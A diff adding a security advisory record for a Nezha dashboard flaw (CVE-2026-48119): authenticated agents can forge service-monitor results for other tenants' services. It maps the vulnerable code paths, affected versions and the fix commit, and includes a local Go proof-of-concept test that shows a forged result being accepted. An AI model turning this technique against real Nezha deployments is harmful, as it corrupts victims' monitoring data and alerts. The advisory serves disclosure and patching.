@@ -1,0 +1,72 @@
+{
+  "id": "GHSA-4g6j-g789-rghm",
+  "modified": "2026-06-01T14:15:12.876258544Z",
+  "published": "2026-06-01T14:05:06Z",
+  "aliases": [
+    "CVE-2026-48119"
+  ],
+  "summary": "Nezha's authenticated agents can forge service-monitor results for other users' services",
+  "details": "#### Summary\n\nNezha accepts service-monitor `TaskResult` messages from an authenticated agent based only on whether the reported service ID exists. The dashboard authenticates the agent and derives the reporter server ID from the gRPC stream, but the service-monitor result worker does not verify that the reporter server was selected for that service, belongs to the service owner, or was actually assigned that monitoring task.\n\nA low-privilege user with a valid agent secret and one registered agent can therefore submit forged monitoring results for another user's service ID. This allows cross-tenant corruption of service-monitor history/current state, and can influence victim-owned service notifications with attacker-controlled result text.\n\n#### Details\n\nThe agent task stream accepts inbound `TaskResult` messages after authenticating agent metadata:\n\n- `service/rpc/auth.go:23-60` validates `client_secret` and `client_uuid`.\n- `service/rpc/auth.go:63-75` registers an unknown valid UUID as a server for the authenticated secret owner.\n- `service/rpc/nezha.go:40-48` authenticates the `RequestTask` stream and binds it to `clientID`.\n- `service/rpc/nezha.go:50-56` receives agent-controlled `TaskResult` messages.\n- `proto/nezha.proto:60-65` defines attacker-controlled `TaskResult.id`, `type`, `delay`, `data`, and `successful`.\n\nFor service-monitor task types, the result is dispatched directly to the service sentinel using the authenticated server ID as reporter:\n\n- `service/rpc/nezha.go:85-90` dispatches service-monitor result types to `ServiceSentinelShared.Dispatch` with `Reporter: clientID`.\n- `model/service.go:131-140` treats non-operational task types as service-monitor result types.\n\nThe vulnerable authorization gap is in the service-monitor worker:\n\n- `service/singleton/servicesentinel.go:475-483` checks only that `r.Data.GetId()` resolves to an existing service.\n- It does not check that `r.Reporter` is covered by that service.\n- It does not check that the service owner owns the reporter server.\n- It does not check that the dashboard actually sent this service-monitor task to that agent.\n\nThe forged result is then recorded and used for service status processing:\n\n- `service/singleton/servicesentinel.go:487-528` records ping service history keyed by `ServiceID` and `Reporter`.\n- `service/singleton/servicesentinel.go:543-624` updates today's status, current service state, and state-change handling.\n- `service/singleton/servicesentinel.go:723-739` can send victim-owned notifications containing `mh.Data`, which is attacker-controlled result text.\n\nThis is inconsistent with outbound service-monitor dispatch, which does enforce service coverage and ownership before sending tasks to agents:\n\n- `cmd/dashboard/rpc/rpc.go:84-109` sends service-monitor tasks only to selected/non-skipped servers according to `Service.Cover` and `SkipServers`.\n- `cmd/dashboard/rpc/rpc.go:96-107` calls `canSendTaskToServer` before sending.\n- `cmd/dashboard/rpc/rpc.go:182-193` permits outbound dispatch only when the service owner owns the server, or when the service owner is an admin.\n- `cmd/dashboard/controller/service.go:478-480` and `cmd/dashboard/controller/service.go:590-607` validate selected servers, trigger tasks, and notification groups during service creation/update.\n\nThe inbound result path should mirror these authorization checks before accepting a result.\n\n#### PoC\n\nThe following local PoC creates a temporary Go test file in `service/singleton`, uses an in-memory SQLite database, does not start the dashboard listener, does not contact public systems, and removes the temporary test file on exit.\n\nThe PoC proves the vulnerable processing path by creating:\n\n- victim user ID `100`;\n- victim service ID `10`;\n- victim server ID `1`;\n- attacker user ID `200`;\n- attacker reporter server ID `2`.\n\nThe victim service is configured with `ServiceCoverIgnoreAll` and only server `1` enabled. Therefore, the dashboard's outbound service-monitor dispatch logic would not send this task to attacker server `2`.\n\nThe forged inbound result from reporter `2` is nevertheless accepted and creates a `ServiceHistory` row for victim service `10`.\n\nEnvironment tested:\n\n- Repository: `https://github.com/nezhahq/nezha.git`\n- Commit: `79c06d0f95ad4e0eedc01a72fc0c54f4666cb0bf`\n- OS: Linux\n- Test date: 2026-05-19\n\nFrom a clean checkout of the tested commit, run:\n\n```sh\nset -e\npocfile=$(mktemp service/singleton/service_spoof_poc_XXXX_test.go)\ncleanup() {\n  rm -f \"$pocfile\"\n}\ntrap cleanup EXIT\n\ncat \u003e \"$pocfile\" \u003c\u003c'EOF'\npackage singleton\n\nimport (\n\t\"testing\"\n\t\"time\"\n\n\t\"github.com/patrickmn/go-cache\"\n\t\"github.com/robfig/cron/v3\"\n\t\"gorm.io/driver/sqlite\"\n\t\"gorm.io/gorm\"\n\n\t\"github.com/nezhahq/nezha/model\"\n\tpb \"github.com/nezhahq/nezha/proto\"\n)\n\nfunc replaceServerSharedForSpoofPoC(t *testing.T, servers ...*model.Server) {\n\tt.Helper()\n\n\toriginal := ServerShared\n\tserverClass := \u0026ServerClass{\n\t\tclass: class[uint64, *model.Server]{\n\t\t\tlist: make(map[uint64]*model.Server),\n\t\t},\n\t\tuuidToID: make(map[string]uint64),\n\t}\n\tfor _, server := range servers {\n\t\tserverClass.list[server.ID] = server\n\t}\n\tServerShared = serverClass\n\tt.Cleanup(func() { ServerShared = original })\n}\n\nfunc TestForgedAgentServiceResultCreatesHistoryForUnassignedService(t *testing.T) {\n\toriginalDB := DB\n\toriginalConf := Conf\n\toriginalCache := Cache\n\toriginalCronShared := CronShared\n\toriginalServerShared := ServerShared\n\toriginalServiceSentinelShared := ServiceSentinelShared\n\toriginalNotificationShared := NotificationShared\n\toriginalTSDB := TSDBShared\n\toriginalLoc := Loc\n\n\tt.Cleanup(func() {\n\t\tDB = originalDB\n\t\tConf = originalConf\n\t\tCache = originalCache\n\t\tCronShared = originalCronShared\n\t\tServerShared = originalServerShared\n\t\tServiceSentinelShared = originalServiceSentinelShared\n\t\tNotificationShared = originalNotificationShared\n\t\tTSDBShared = originalTSDB\n\t\tLoc = originalLoc\n\t})\n\n\tdb, err := gorm.Open(sqlite.Open(\"file::memory:?cache=shared\"), \u0026gorm.Config{})\n\tif err != nil {\n\t\tt.Fatal(err)\n\t}\n\tDB = db\n\n\tif err := DB.AutoMigrate(\n\t\tmodel.Server{},\n\t\tmodel.Service{},\n\t\tmodel.ServiceHistory{},\n\t\tmodel.Notification{},\n\t\tmodel.NotificationGroup{},\n\t\tmodel.NotificationGroupNotification{},\n\t); err != nil {\n\t\tt.Fatal(err)\n\t}\n\n\tConf = \u0026ConfigClass{Config: \u0026model.Config{AvgPingCount: 1}}\n\tCache = cache.New(time.Minute, time.Minute)\n\tCronShared = \u0026CronClass{\n\t\tCron:  cron.New(cron.WithSeconds()),\n\t\tclass: class[uint64, *model.Cron]{list: map[uint64]*model.Cron{}},\n\t}\n\tNotificationShared = \u0026NotificationClass{\n\t\tclass:         class[uint64, *model.Notification]{list: map[uint64]*model.Notification{}},\n\t\tgroupToIDList: map[uint64]map[uint64]*model.Notification{},\n\t\tidToGroupList: map[uint64]map[uint64]struct{}{},\n\t\tgroupList:     map[uint64]string{},\n\t}\n\n\treplaceServerSharedForSpoofPoC(t,\n\t\t\u0026model.Server{Common: model.Common{ID: 1, UserID: 100}, Name: \"victim-server\"},\n\t\t\u0026model.Server{Common: model.Common{ID: 2, UserID: 200}, Name: \"attacker-agent\"},\n\t)\n\n\tLoc = time.UTC\n\n\tbus := make(chan *model.Service, 1)\n\tss, err := NewServiceSentinel(bus)\n\tif err != nil {\n\t\tt.Fatal(err)\n\t}\n\tServiceSentinelShared = ss\n\n\tvictimService := \u0026model.Service{\n\t\tCommon:      model.Common{ID: 10, UserID: 100},\n\t\tName:        \"victim-private-service\",\n\t\tType:        model.TaskTypeTCPPing,\n\t\tTarget:      \"example.invalid:443\",\n\t\tDuration:    3600,\n\t\tCover:       model.ServiceCoverIgnoreAll,\n\t\tSkipServers: map[uint64]bool{1: true},\n\t}\n\tif err := DB.Create(victimService).Error; err != nil {\n\t\tt.Fatal(err)\n\t}\n\tif err := ss.Update(victimService); err != nil {\n\t\tt.Fatal(err)\n\t}\n\n\tss.Dispatch(ReportData{\n\t\tReporter: 2,\n\t\tData: \u0026pb.TaskResult{\n\t\t\tId:         10,\n\t\t\tType:       model.TaskTypeTCPPing,\n\t\t\tDelay:      12,\n\t\t\tData:       \"forged result from unauthorized agent\",\n\t\t\tSuccessful: true,\n\t\t},\n\t})\n\n\tdeadline := time.After(2 * time.Second)\n\tfor {\n\t\tvar count int64\n\t\tif err := DB.Model(\u0026model.ServiceHistory{}).\n\t\t\tWhere(\"service_id = ? AND server_id = ?\", 10, 2).\n\t\t\tCount(\u0026count).Error; err != nil {\n\t\t\tt.Fatal(err)\n\t\t}\n\n\t\tif count \u003e 0 {\n\t\t\treturn\n\t\t}\n\n\t\tselect {\n\t\tcase \u003c-deadline:\n\t\t\tt.Fatalf(\"expected forged history row for service 10 from unauthorized reporter 2\")\n\t\tdefault:\n\t\t\ttime.Sleep(10 * time.Millisecond)\n\t\t}\n\t}\n}\nEOF\n\ngo test ./service/singleton -run TestForgedAgentServiceResultCreatesHistoryForUnassignedService -count=1 -v\n```\n\nExpected vulnerable output:\n\n```text\n=== RUN   TestForgedAgentServiceResultCreatesHistoryForUnassignedService\n--- PASS: TestForgedAgentServiceResultCreatesHistoryForUnassignedService\nPASS\nok  \tgithub.com/nezhahq/nezha/service/singleton\n```\n\nObserved output in my local test environment:\n\n```text\n=== RUN   TestForgedAgentServiceResultCreatesHistoryForUnassignedService\n--- PASS: TestForgedAgentServiceResultCreatesHistoryForUnassignedService (0.01s)\nPASS\nok  \tgithub.com/nezhahq/nezha/service/singleton\t0.020s\n```\n\nThe test passes because a forged result from reporter server `2` creates a service-history row for victim service `10`, even though service `10` only covers victim server `1`.\n\nA fixed version should reject or ignore this forged result. After a fix, the current PoC should fail at the assertion waiting for a `ServiceHistory` row unless the test is changed to assert that `count == 0`.\n\nNote: this is a local processing-path PoC. It directly exercises the same service sentinel worker that the authenticated gRPC `RequestTask` path dispatches to. It does not open a network gRPC connection, send real notifications, or execute commands.\n\n#### Impact\n\nA low-privilege Nezha user with a valid agent secret can forge service-monitor results for services outside their ownership boundary.\n\nConfirmed impact:\n\n- Cross-tenant service-monitor integrity violation.\n- False service history entries for victim-owned services.\n- Poisoned service availability/current-state data.\n\nLikely impact through the same processing path:\n\n- Victim-owned service notifications can be triggered with attacker-controlled result text.\n- Monitoring reliability can be degraded by false up/down/latency results.\n\nThis does not require dashboard administrator privileges. The attacker only needs a normal account/agent secret and one registered agent/server.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Go",
+        "name": "github.com/nezhahq/nezha",
+        "purl": "pkg:golang/github.com/nezhahq/nezha"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "0.20.0"
+            },
+            {
+              "fixed": "1.14.15-0.20260521020202-02129f16fb15"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/06/GHSA-4g6j-g789-rghm/GHSA-4g6j-g789-rghm.json"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "Go",
+        "name": "github.com/nezhahq/nezha",
+        "purl": "pkg:golang/github.com/nezhahq/nezha"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "2.0.0"
+            },
+            {
+              "fixed": "2.0.12"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/06/GHSA-4g6j-g789-rghm/GHSA-4g6j-g789-rghm.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/nezhahq/nezha/security/advisories/GHSA-4g6j-g789-rghm"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/nezhahq/nezha/commit/02129f16fb1572ef57c7e8dd7d03f84d39b8b586"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/nezhahq/nezha"
+    }
+  ]
+}
